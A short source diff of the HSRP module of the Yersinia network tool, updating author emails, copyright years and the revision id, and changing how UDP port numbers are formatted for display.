@@ -2,8 +2,8 @@
  * Implementation and attacks for Cisco Hot Standby Router Protocol
  *
  * Yersinia
- * By David Barroso <tomac@wasahero.org> and Alfredo Andres <slay@wasahero.org>
- * Copyright 2005 Alfredo Andres and David Barroso
+ * By David Barroso <tomac@yersinia.net> and Alfredo Andres <slay@yersinia.net>
+ * Copyright 2005, 2006, 2007 Alfredo Andres and David Barroso
  *
  * This program is free software; you can redistribute it and/or
  * modify it under the terms of the GNU General Public License
@@ -24,7 +24,7 @@
 
 #ifndef lint
 static const char rcsid[] = 
-       "$Id: hsrp.c 17 2006-04-17 21:02:28Z tomac $";
+       "$Id: hsrp.c 46 2007-05-08 09:13:30Z slay $";
 #endif
 
 #ifdef HAVE_CONFIG_H
@@ -678,17 +678,17 @@ hsrp_get_printable_packet(struct pcap_data *data)
     /* Source port */
 #ifdef LBL_ALIGN
     memcpy((void *)&aux_short, udp_data, 2);
-    snprintf(field_values[HSRP_SPORT], 6, "%05hd", ntohs(aux_short));
+    snprintf(field_values[HSRP_SPORT], 6, "%d", ntohs(aux_short));
 #else
-    snprintf(field_values[HSRP_SPORT], 6, "%05hd", ntohs(*(u_int16_t *)udp_data));
+    snprintf(field_values[HSRP_SPORT], 6, "%d", ntohs(*(u_int16_t *)udp_data));
 #endif
 
     /* Destination port */
 #ifdef LBL_ALIGN
     memcpy((void *)&aux_short, udp_data+2, 2);
-    snprintf(field_values[HSRP_DPORT], 6, "%05hd", ntohs(aux_short));
+    snprintf(field_values[HSRP_DPORT], 6, "%d", ntohs(aux_short));
 #else
-    snprintf(field_values[HSRP_DPORT], 6, "%05hd", ntohs(*(u_int16_t *)(udp_data+2)));
+    snprintf(field_values[HSRP_DPORT], 6, "%d", ntohs(*(u_int16_t *)(udp_data+2)));
 #endif
 
     /* Version */
